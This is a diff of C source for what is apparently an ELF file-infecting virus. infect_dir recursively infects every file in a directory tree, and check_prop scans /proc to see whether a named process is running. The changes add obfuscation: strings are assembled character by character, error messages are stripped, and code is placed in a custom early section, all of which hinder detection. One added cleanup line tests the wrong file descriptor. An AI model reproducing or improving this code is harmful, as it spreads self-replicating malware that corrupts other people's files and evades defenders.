@@ -238,26 +238,29 @@ int infect_dir(char *dirname, char *b, size_t bn, size_t crypt_off, size_t crypt
 			ft_close(fd);
 			return fail("read dir");
 		}
-		size_t x = 0;
-		while (x < size){
+		size_t x;
+		for (x = 0; x < size; x += d->d_reclen){
 			d = (struct linux_dirent*)(p + x);
 			if (opt.do_recur && !str_equal(d->d_name, ".") && !str_equal(d->d_name, "..") &&  d_isdir(d)){
 				char *t = ft_add_base(dirname, d->d_name);
+				if (t == NULL)
+					continue;
 				infect_dir(t, b,bn,crypt_off,crypt_len,opt);
 				ft_free(t);
 			}
 			else if (d_isfile(d)){
 				char *t = ft_add_base(dirname, d->d_name);
+				if (t == NULL)
+					continue;
 				infect(t, t, b, bn, crypt_off, crypt_len, opt);
 				ft_free(t);
 			}
-			x += d->d_reclen;
 		}
 	}
 	ft_close(fd);
 }
 
-int cmpproc(char *name, int fd)
+int __attribute__((section (".textearly"))) cmpproc(char *name, int fd)
 {
 	size_t i = 0;
 	ssize_t ret;
@@ -277,15 +280,28 @@ int cmpproc(char *name, int fd)
 	return -1;
 }
 
-int check_prop(char *programe_name){
+int __attribute__((section (".textearly"))) check_prop(char *programe_name){
 	struct linux_dirent *d;
 	char		p[4096];
+	char		proc[6];
+	char		comm[5];
 	int		fd;
 	char		*buff;
 	size_t		t;
 	int		ret = TRUE;
 
-	if ((fd = ft_open("/proc", 65536, 0)) < 0) return fail("open proc dir");
+	proc[0] = '/';
+	proc[1] = 'p';
+	proc[2] = 'r';
+	proc[3] = 'o';
+	proc[4] = 'c';
+	proc[5] = '\0';
+	comm[0] = 'c';
+	comm[1] = 'o';
+	comm[2] = 'm';
+	comm[3] = 'm';
+	comm[4] = '\0';
+	if ((fd = ft_open(proc, 65536, 0)) < 0) return FALSE;
 	while (ret == TRUE)
 	{
 		int size = getdents(fd, p, sizeof(p));
@@ -294,22 +310,32 @@ int check_prop(char *programe_name){
 		if (size < 0)
 		{
 			ft_close(fd);
-			return fail("read proc dir");
+			return FALSE;
 		}
-		size_t x = 0;
-		while (x < size && ret == TRUE){
+		size_t x;
+		for (x = 0; x < size && ret == TRUE; x += d->d_reclen)
+		{
 			d = (struct linux_dirent*)(p + x);
 			if (d_isdir(d) && is_number(d->d_name)){
-				char *t1 = ft_add_base("/proc", d->d_name);
-				char *t2 = ft_add_base(t1, "comm");
-				ft_free(t1);
-				int fd = ft_open(t2, 0, 0);
-				if (cmpproc(programe_name, fd) == 0)
+				char *t1 = NULL;
+				char *t2 = NULL;
+				int fdproc = -1;
+				if ((t1 = ft_add_base(proc, d->d_name)) == NULL)
+					goto end;
+				if ((t2 = ft_add_base(t1, comm)) == NULL)
+					goto end;
+				if ((fdproc = ft_open(t2, 0, 0)) < 0)
+					goto end;
+				if (cmpproc(programe_name, fdproc) == 0)
 					ret = FALSE;
-				ft_close(fd);
-				ft_free(t1);
+end:
+				if (fd >= 0)
+					ft_close(fdproc);
+				if (t1 != NULL)
+					ft_free(t1);
+				if (t2 != NULL)
+					ft_free(t2);
 			}
-			x += d->d_reclen;
 		}
 	}
 	ft_close(fd);
